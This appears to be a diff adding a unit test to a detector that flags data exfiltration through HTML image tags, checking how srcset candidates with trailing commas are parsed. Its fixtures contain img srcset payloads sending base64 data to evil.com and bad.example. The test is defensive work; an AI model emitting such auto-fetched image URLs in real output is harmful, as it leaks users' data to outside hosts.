@@ -2077,6 +2077,30 @@ describe("unit: detectExfil HTML-attr + node types", () => {
     );
     assert.equal(threat.target, "evil.com");
   });
+  it("strips a whole RUN of trailing commas off a srcset candidate", () => {
+    // The first candidate's URL run ends in `,,,`: the whole comma tail comes
+    // off (a URL keeping it would not parse to `evil.com`) and the run counts
+    // as bare, so the second candidate after it is parsed too.
+    assert.deepEqual(
+      detectExfil(
+        `<img srcset="https://evil.com/a.png?data=${b64},,, https://bad.example/b.png?data=${b64} 2x">`,
+      ),
+      [
+        {
+          isImage: true,
+          autoFetched: true,
+          reason: "suspicious query parameter",
+          target: "evil.com",
+        },
+        {
+          isImage: true,
+          autoFetched: true,
+          reason: "suspicious query parameter",
+          target: "bad.example",
+        },
+      ],
+    );
+  });
   it("keeps a srcset URL that itself contains commas intact (no split shredding)", () => {
     const threat = onlyThreat(
       `<img srcset="https://evil.com/b.png?a=1,2&data=${b64} 2x">`,
